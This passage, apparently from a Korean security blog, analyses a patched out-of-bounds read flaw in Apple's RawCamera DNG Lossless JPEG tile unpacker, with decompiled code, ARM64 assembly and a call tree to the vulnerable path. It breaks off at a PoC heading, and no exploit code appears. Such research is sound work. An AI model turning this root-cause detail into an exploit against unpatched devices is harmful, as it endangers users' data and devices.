&#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xACE0;(LUT &#xC624;&#xD504;&#xC14B; +156 / +412 / +668), 16-bit&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; dst += 3 &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>&#xD589; &#xC774;&#xB3D9;&#xC740; BytesPerRow * y&#xB97C; &#xB354;&#xD574; &#xCC98;&#xB9AC;</p><p><strong>G100 (18.6.2)</strong></p></li><li><p>CVPixelBufferGetBaseAddress()&#xB85C; &#xAE30;&#xBC18; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC740; &#xB4A4;, <strong>base + 2&#xC5D0;&#xC11C; &#xC2DC;&#xC791;</strong>&#xD574; B &#x2192; G &#x2192; R &#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>v41(=base+2) &#x2192; <strong>B</strong> &#x2192; LUT(+668)</li><li>(v41-1)(=base+1) &#x2192; <strong>G</strong> &#x2192; LUT(+412)</li><li>(v41-2)(=base+0) &#x2192; <strong>R</strong> &#x2192; LUT(+156)</li><li>&#xC774;&#xD6C4; v41 += 4 (&#xB2E4;&#xC74C; &#xD53D;&#xC140;)</li></ul><p>&#x2192; &#xC785;&#xB825; &#xD3EC;&#xB9F7;&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; BGRA/ RGBA &#xACC4;&#xC5F4;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xCC44;&#xB110; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACE0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. </p></li></ul></li></ol><p>&#xBCC0;&#xACBD; &#xC810;&#xC774; &#xC788;&#xB358; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC9C0; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, G90(18.6.1)&#xC740; CGImage &#xACBD;&#xB85C;&#xB85C; &#xB514;&#xCF54;&#xB529;&#xD55C; &#xB4A4; CFData&#xB97C; &#xC9C1;&#xC811; &#xC21C;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB54C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; &#x2018;&#xD3ED;&#xACFC; &#xB192;&#xC774;&#xC758; &#xC77C;&#xCE58;&#x2019; &#xC640; &#x2018;CFDataGetLength() == 4 &#xD7; W &#xD7; H&#x2018; &#xC774;&#xB807;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xBFD0;&#xC774;&#xC5C8;&#xACE0;, &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xD589; &#xB2E8;&#xC704; &#xC624;&#xD504;&#xC14B;(<code>BytesPerRow</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xC774;&#xBBF8;&#xC9C0;(&#xC0C9;&#xACF5;&#xAC04;&#xB7;&#xC11C;&#xBE0C;&#xC0D8;&#xD50C;&#xB9C1;&#xB7;&#xD589; &#xD328;&#xB529; &#xB4F1;) <strong>&#xAC80;&#xC99D;&#xC740; &#xD1B5;&#xACFC;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xC811;&#xADFC;&#xC740; CFData &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB0A0; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</strong> </p><p>&#xC774;&#xB7EC;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xD328;&#xCE58;&#xD55C; G100(18.6.2)&#xC5D0;&#xC11C;&#xB294; &#xB514;&#xCF54;&#xB529;&#xC744; CMPhoto(+ JFIF &#xD55C;&#xC815;) &#x2192; CVPixelBuffer&#xB85C; &#xC804;&#xD658;&#xD558;&#xC600;&#xACE0;, &#xC2E4;&#xC81C; &#xBC84;&#xD37C; &#xCD1D; &#xBC14;&#xC774;&#xD2B8; &#xC218;(<code>CVPixelBufferGetDataSize</code>)&#xB97C; &#xB0B4;&#xBD80; &#xD5EC;&#xD37C;&#xAC00; &#xACC4;&#xC0B0;&#xD55C; &#xAE30;&#xB300; &#xD06C;&#xAE30;(&#xD3ED;&#xB7;&#xB192;&#xC774; &#xB4F1;)&#xC640; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. </p><hr><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>(G90 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><p>&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xC911;&#xC5D0; <code>sub_1DD8A7684</code> &#xAC00; vtable&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>C++ &#xAC1D;&#xCCB4;&#xB294; &#xCCAB; &#xD544;&#xB4DC;&#xAC00; &#xBCF4;&#xD1B5; vptr(vtable &#xD3EC;&#xC778;&#xD130;)&#xC774;&#xACE0;, &#xAC00;&#xC0C1;&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; this-&gt;vptr[slot]&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; RawCamera &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; strip &#xB418;&#xC5B4; &#xC2EC;&#xBCFC;&#xC774; &#xC9C0;&#xC6CC;&#xC838;&#xC788;&#xC5B4;&#xC11C; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xAE30;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xC27D;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp">[ex](*(*<span class="hljs-keyword">this</span>)+<span class="hljs-number">0xE0</span>)(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><pre><code class="hljs cpp">[ex]<span class="hljs-keyword">this</span>-&gt;vptr-&gt;unpack_lossless(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>&#xADF8;&#xB798;&#xC11C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C;, &#xC5B4;&#xB5A4; &#xC778;&#xC790;&#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xC9C0; &#xB4F1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC704;&#xCC98;&#xB7FC; vtable&#xC744; &#xAD6C;&#xC870;&#xCCB4;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBA3C;&#xC800; &#xC9C4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>IDAPython&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>vtable &#xD30C;&#xC2F1; &#xD6C4; &#xAD6C;&#xC870;&#xCCB4;&#xD654;</li><li>&#xBAA8;&#xB4E0; &#xAC00;&#xC0C1; &#xD568;&#xC218;&#xC5D0; &#xCCAB; &#xC778;&#xC790; <code>struct CDNGLosslessJpegUnpacker *this</code> &#xC801;&#xC6A9; (this&#xB97C; &#xD074;&#xB798;&#xC2A4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xD0C0;&#xC785;&#xD654;)</li></ol><p>&#xC774;&#xB807;&#xAC8C; &#xC801;&#xC6A9;&#xD558;&#xBA74; <code>(*(*this)+0xE0)(this)</code> &#xAC00; <code>this-&gt;vptr-&gt;fn_028(this, &#x2026;)</code> &#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xACE0;, &#xD544;&#xB4DC; &#xC811;&#xADFC;&#xB3C4; <code>this-&gt;field_d8</code>&#xCC98;&#xB7FC; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC2AC;&#xB86F; &#xB9E4;&#xD551;&#xACFC; &#xCD94;&#xC801;&#xC774; &#xC26C;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC9C0; &#xCF5C;&#xD2B8;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image14.png" alt="image.png"></p><p>&#xBA3C;&#xC800; Lossless&#xB97C; &#xD544;&#xD130;&#xB9C1; &#xAC78;&#xC5B4;, &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xACF5;&#xAC1C;&#xB41C; <code>CDNGLosslessJpegUnpacker</code> &#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA74; <code>sub_1DD95DE88</code> &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC0C1;&#xC138; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD95DE88</span><span class="hljs-params">(<span class="hljs-keyword">os_signpost_id_t</span> a1, __int64 a2, __int64 a3, __int64 a4)</span></span><span class="hljs-function"></span>{  .  .  .    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">216</span>)    || (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">os_signpost_id_t</span>))(*(_QWORD *)a1 + <span class="hljs-number">224L</span>L))(a1) == <span class="hljs-number">2</span>    || (v12 = *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>), v12 == <span class="hljs-number">4</span>) )  {    sub_1DD9009D4(a1, a2, a3, a4);  }  <span class="hljs-keyword">else</span>  {    v14 = *(_DWORD *)(a1 + <span class="hljs-number">44</span>);    v13 = *(_DWORD *)(a1 + <span class="hljs-number">48</span>);    v15 = *(_DWORD *)(a1 + <span class="hljs-number">224</span>);    v16 = *(_DWORD *)(a1 + <span class="hljs-number">228</span>);    *(_QWORD *)&amp;v35 = v12 &gt;&gt; <span class="hljs-number">2</span>;    sub_1DD8731E0(&amp;v36, &amp;v35);    <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>) != *(_QWORD *)(a1 + <span class="hljs-number">264</span>) - *(_QWORD *)(a1 + <span class="hljs-number">256</span>)      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v14 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || v15 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || v16 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || (v28 = v11, v17 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v36, v36 &gt;= <span class="hljs-number">20000</span>) )    {      exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(exception_15, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    v29 = a4;    <span class="hljs-keyword">if</span> ( (((v13 + v16 - <span class="hljs-number">1</span>) / v16) &gt;&gt; (*(_DWORD *)(a1 + <span class="hljs-number">216</span>) != <span class="hljs-number">0</span>)) * ((v14 + v15 - <span class="hljs-number">1</span>) / v15) != v36 )    {      v27 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v27, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(v27, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    group = dispatch_group_create();    v30 = dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, MEMORY[<span class="hljs-number">0x1E6FA52F0</span>]);</code></pre><p><code>sub_1DD95DE88</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; 3&#xAC00;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. </p><ul><li><p>[this+0xD8] != 0</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF30</span>  LDR   W8, [X23,#<span class="hljs-number">0xD8</span>]<span class="hljs-number">0x1DD95DF34</span>  CBNZ  W8, loc_1DD95DF78</code></pre><p>  &#x2192; 0&#xC774; &#xC544;&#xB2C8;&#xBA74; &#xBC14;&#xB85C; <code>loc_1DD95DF78</code> &#xACBD;&#xB85C;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;.</p></li><li><p>vtable &#xC624;&#xD504;&#xC14B; 0xE0(&#xC2AC;&#xB86F; &#xC778;&#xB371;&#xC2A4; 28) &#xD638;&#xCD9C; &#xACB0;&#xACFC;&#xAC00; 2&#xC778;&#xC9C0; &#xBE44;&#xAD50;</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF38</span>  LDR   X16, [X23]           ; vtable = [<span class="hljs-keyword">this</span>]<span class="hljs-number">0x1DD95DF44</span>  AUTDA X16, X17             ; (PAC &#xD574;&#xC81C;)<span class="hljs-number">0x1DD95DF48</span>  LDR   X8,  [X16,#<span class="hljs-number">0xE0</span>]!    ; fn = vtable[<span class="hljs-number">0xE0</span>/<span class="hljs-number">8</span>] &#x2190; &#xC2AC;&#xB86F; <span class="hljs-number">28</span><span class="hljs-number">0x1DD95DF50</span>  MOV   X0,  X23             ; <span class="hljs-keyword">this</span><span class="hljs-number">0x1DD95DF5C</span>  BLRAA X8, X17              ; &#xAC04;&#xC811; &#xD638;&#xCD9C;<span class="hljs-number">0x1DD95DF60</span>  CMP   W0,  #<span class="hljs-number">2</span>              ; &#xBC18;&#xD658;&#xAC12; == <span class="hljs-number">2</span> ?<span class="hljs-number">0x1DD95DF64</span>  B.EQ  loc_1DD95DF78</code></pre><p>  &#x2192; &#xBC18;&#xD658;&#xAC12;&#xC774; 2&#xBA74; <code>loc_1DD95DF78</code>&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>([this+0xF0] - [this+0xE8]) == 4 &#xCCB4;&#xD06C;</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF68</span>  LDP   X9, X8, [X23,#<span class="hljs-number">0xE8</span>]  ; X9=[E8], X8=[F0]<span class="hljs-number">0x1DD95DF6C</span>  SUB   X8, X8, X9           ; (F0 - E8)<span class="hljs-number">0x1DD95DF70</span>  CMP   X8, #<span class="hljs-number">4</span><span class="hljs-number">0x1DD95DF74</span>  B.NE  loc_1DD95E008</code></pre><p>  &#x2192; &#xCC28;&#xC774;&#xAC00; 4&#xAC00; &#xC544;&#xB2C8;&#xBA74; loc_1DD95E008 &#xACBD;&#xB85C;&#xB85C; &#xBE60;&#xC9C0;&#xACE0;, 4&#xC774;&#xBA74; &#xC704;&#xC758; &#xBD84;&#xAE30;&#xB4E4;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xD1B5;&#xACFC;&#xD558;&#xC5EC; loc_1DD95DF78 &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p></li></ul><pre><code class="hljs angelscript"><span class="hljs-comment">// sub_1DD95DE88</span><span class="hljs-keyword">if</span> ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xD8</span>] != <span class="hljs-number">0</span>               <span class="hljs-comment">// 0xD8 &#xD50C;&#xB798;&#xADF8;</span> || vtable[<span class="hljs-number">28</span>](<span class="hljs-keyword">this</span>) == <span class="hljs-number">2</span>          <span class="hljs-comment">// &#xC2AC;&#xB86F; 28 &#xD638;&#xCD9C; &#xBC18;&#xD658;&#xAC12;</span> || ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xF0</span>]-[<span class="hljs-keyword">this</span>+<span class="hljs-number">0xE8</span>]) == <span class="hljs-number">4</span> <span class="hljs-comment">// &#xAE38;&#xC774;/&#xC624;&#xD504;&#xC14B; &#xC77C;&#xCE58;</span>) {    <span class="hljs-comment">// &#xD0C0;&#xC77C; &#xD050; &#xC548; &#xD0D0; (&#xCDE8;&#xC57D; &#xACBD;&#xB85C; &#xC544;&#xB2D8;)</span>    sub_1DD9009D4(...);} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// &#xD0C0;&#xC77C; &#xD050; &#xACBD;&#xB85C; &#x2192; &#xCDE8;&#xC57D; &#xACBD;&#xB85C;&#xB85C; &#xC9C4;&#xC785; &#xAC00;&#xB2A5;</span>    dispatch_group_create();    dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, ...);    <span class="hljs-comment">// &#xAC01; &#xD0C0;&#xC77C; &#xC791;&#xC5C5; &#xBE14;&#xB85D; &#xB0B4;&#xBD80;:</span>    sub_1DD95E410 &#x2192; sub_1DD95DCD8 &#x2192; (HW) sub_1DD95E4A4 &#xB610;&#xB294; (SW) sub_1DD95B198    <span class="hljs-comment">// &#xCD5C;&#xC885; &#xD53D;&#xC140; &#xBCC0;&#xD658;:</span>    &#x2264;<span class="hljs-number">8</span>bpp: sub_1DD95EF54 &#x2192; LUT &#xAC8C;&#xC774;&#xD2B8; sub_1DDA4EF58    &#x2265;<span class="hljs-number">9</span>bpp: sub_1DD95EA64 &#x2192; LUT &#xAC8C;&#xC774;&#xD2B8; sub_1DDA4EF58}</code></pre><p>&#xC774; &#xC870;&#xAC74;&#xC774; &#xC131;&#xB9BD;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xC5D0;&#xC11C; &#x201C;Lossless DNG Tile Unpacker Queue&#x201D;&#xB77C;&#xB294; &#xD0C0;&#xC77C; &#xB2E8;&#xC704; &#xD574;&#xC81C; &#xD050;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xACE0;, &#xADF8; &#xD558;&#xC704; &#xACBD;&#xB85C;&#xAC00; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><hr><p>&#xC774;&#xB54C; &#xD0C0;&#xC77C; &#xD050;&#xB294; &#xD55C; &#xC7A5;&#xC9DC;&#xB9AC; &#xD070; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; TileWidth &#xD7; TileLength &#xD06C;&#xAE30;&#xC758; &#xC791;&#xC740; &#xC870;&#xAC01;&#xC73C;&#xB85C; &#xCABC;&#xAC1C;&#xC11C;, &#xD0C0;&#xC77C;&#xBCC4;&#xB85C; &#xB514;&#xCF54;&#xB4DC; &#x2192; &#xC0C9;&#xBCF4;&#xC815; &#x2192; &#xCD9C;&#xB825; &#xBC84;&#xD37C; &#xBC30;&#xCE58; &#xB4F1;&#xC758; &#xACFC;&#xC815;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-number">0x1DD95DE88</span>    <span class="hljs-number">0x1DD95E410</span>        <span class="hljs-number">0x1DD95DCD8</span>            <span class="hljs-number">0x1DD95E4A4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95B198</span>                <span class="hljs-number">0x1DD95EF54</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95EA64</span>                    <span class="hljs-number">0x1DDA4EF58</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xCF5C;&#xD2B8;&#xB9AC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC774; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><hr><p><img src="/2025/10/23/clalxk/imageIO_ko/image15.png" alt="image.png"></p><p>Boom..</p><p>&#xC0C8;&#xB85C;&#xC6B4; &#xBA38;&#xB9AC;&#xB85C; &#xB2E4;&#xC2DC; &#xAC00;&#xBCF4;&#xC8E0;.. &gt;&lt;</p><hr><p>&#xC704;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0;&#xB098; DNG &#xB4F1;&#xC744; &#xC5EC;&#xB7EC;&#xBC88; &#xC5B8;&#xAE09;&#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB824;&#xBA74; &#xBC30;&#xACBD; &#xAC1C;&#xB150;&#xC774; &#xD544;&#xC694;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>&#xC774;&#xBBF8;&#xC9C0; &#xAD00;&#xB828; (&#xD53D;&#xC140; / &#xCC44;&#xB110;(=&#xC0D8;&#xD50C;) / &#xBE44;&#xD2B8; &#xAE4A;&#xC774;)</strong></p><ul><li><strong>&#xD53D;&#xC140;</strong>: &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xCD5C;&#xC18C; &#xB2E8;&#xC704;.</li><li><p><strong>&#xCC44;&#xB110;(&#xC0D8;&#xD50C;)</strong>: &#xD53D;&#xC140;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xC218;&#xCE58; &#xC131;&#xBD84; 1&#xAC1C;(R, G, B &#xB4F1;).</p><p>  &#x2192; SamplesPerPixel = &#xD53D;&#xC140;&#xB2F9; &#xCC44;&#xB110; &#xC218;</p><p>  &#x2192; BitsPerSample = &#xCC44;&#xB110; &#xD558;&#xB098;&#xB97C; &#xBA87; &#xBE44;&#xD2B8;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xB294;&#xC9C0;(&#xC815;&#xBC00;&#xB3C4;)</p></li><li><p>&#xC608;&#xC2DC;</p><ul><li>Grayscale: SamplesPerPixel=1, BitsPerSample=8 &#x2192; &#xD53D;&#xC140;&#xB2F9; 1&#xBC14;&#xC774;&#xD2B8;</li><li>RGB 8bpc: SamplesPerPixel=3, BitsPerSample=8 &#x2192; &#xD53D;&#xC140;&#xB2F9; 3&#xBC14;&#xC774;&#xD2B8;</li><li>RGBA 16bpc: SamplesPerPixel=4, BitsPerSample=16 &#x2192; &#xD53D;&#xC140;&#xB2F9; 8&#xBC14;&#xC774;&#xD2B8;</li></ul><p>&#x2192; <strong>&#xC774; &#xBA54;&#xD0C0;&#xAC12;&#xB4E4;&#xB85C; &#xBC84;&#xD37C; &#xD06C;&#xAE30;/stride/&#xB8E8;&#xD504; &#xACBD;&#xACC4;</strong>&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul></li><li><p><strong>DNG</strong> </p><ul><li><strong>Adobe&#xAC00; &#xB9CC;&#xB4E0; RAW &#xC774;&#xBBF8;&#xC9C0; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xD3EC;&#xB9F7;&#xC785;&#xB2C8;&#xB2E4;</strong>. &#xB0B4;&#xBD80;&#xB294; &#xC0AC;&#xC2E4;&#xC0C1; <strong>TIFF/EP &#xAE30;&#xBC18;</strong>&#xC774;&#xB77C; &#xD0DC;&#xADF8;(&#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;)&#xB85C; &#xAD6C;&#xC870;&#xAC00; &#xD45C;&#xD604;&#xB418;&#xACE0;, &#xCE74;&#xBA54;&#xB77C; &#xC13C;&#xC11C;&#xAC00; &#xBC49;&#xC740; &#xAC00;&#xACF5; &#xC804; &#xC6D0;&#xC2DC; &#xB370;&#xC774;&#xD130;(&#xBCA0;&#xC774;&#xC5B4;/CFA &#xB4F1;)&#xC640; &#xC378;&#xB124;&#xC77C;, &#xC0C9; &#xBCF4;&#xC815; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xB2F4;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB370;&#xC774;&#xD130; &#xB2E8;&#xC704;: <strong>Strips, Tiles</strong></li><li>&#xAD00;&#xB828; &#xD575;&#xC2EC; &#xD0DC;&#xADF8;<ul><li>&#xD06C;&#xAE30; &#xACC4;&#xC5F4;: RowsPerStrip &#xB610;&#xB294; TileWidth/TileLength</li><li>&#xC704;&#xCE58;/&#xD06C;&#xAE30;: StripOffsets/TileOffsets, StripByteCounts/TileByteCounts</li><li>&#xD53D;&#xC140; &#xD3EC;&#xB9F7;: SamplesPerPixel, BitsPerSample, (&#xD544;&#xC694; &#xC2DC; PlanarConfiguration &#xB4F1;)</li></ul></li></ul></li></ol><p><strong>&#x2192;</strong> Offsets/ByteCounts&#xB97C; &#xC77D;&#xACE0;, BytesPerRow(stride) &#xACC4;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB514;&#xC5D0; &#xC5BC;&#xB9C8;&#xB098; &#xC4F8;&#xC9C0;&#xB97C; &#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>RAW / &#xC555;&#xCD95;</strong></p><ul><li><p>RAW&#xB294; &#xCE74;&#xBA54;&#xB77C; &#xC13C;&#xC11C;&#xC5D0;&#xC11C; &#xB098;&#xC628; &#xAC00;&#xACF5; &#xC804; &#xB370;&#xC774;&#xD130;&#xB77C; &#xBCF4;&#xD1B5; 12/14/16bpp &#xAC19;&#xC740; &#xB192;&#xC740; &#xBE44;&#xD2B8; &#xC2EC;&#xB3C4;(&#xB300;&#xAC1C; CFA &#xBCA0;&#xC774;&#xC5B4;&#xB77C; &#xD53D;&#xC140;&#xB2F9; 1 &#xC0D8;&#xD50C;)&#xB97C; &#xAC16;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC6A9;&#xB7C9;&#xC774; &#xD07D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; DNG&#xB294; &#xBE44;&#xC555;&#xCD95;&#xB3C4; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB860; &#xBB34;&#xC190;&#xC2E4; &#xC555;&#xCD95;(&#xC608;: Lossless JPEG, Deflate)&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Compression=1 &#x2192; &#xBE44;&#xC555;&#xCD95;</li><li><strong>Compression=7 &#x2192; JPEG (Baseline DCT &#xB610;&#xB294; Lossless JPEG(SOF3))</strong></li><li>Compression=8 &#x2192; Deflate/ZIP</li><li>Compression=34892 &#x2192; Baseline DCT JPEG (lossy)</li></ul><p>&#x2192; &#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>Lossless JPEG(SOF3)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;</strong>&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul></li></ol><hr><h2 id="1-3-PoC"><a href="#1-3-PoC" class="headerlink" title="1.3 PoC"></a>1.3 PoC</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image16.png" 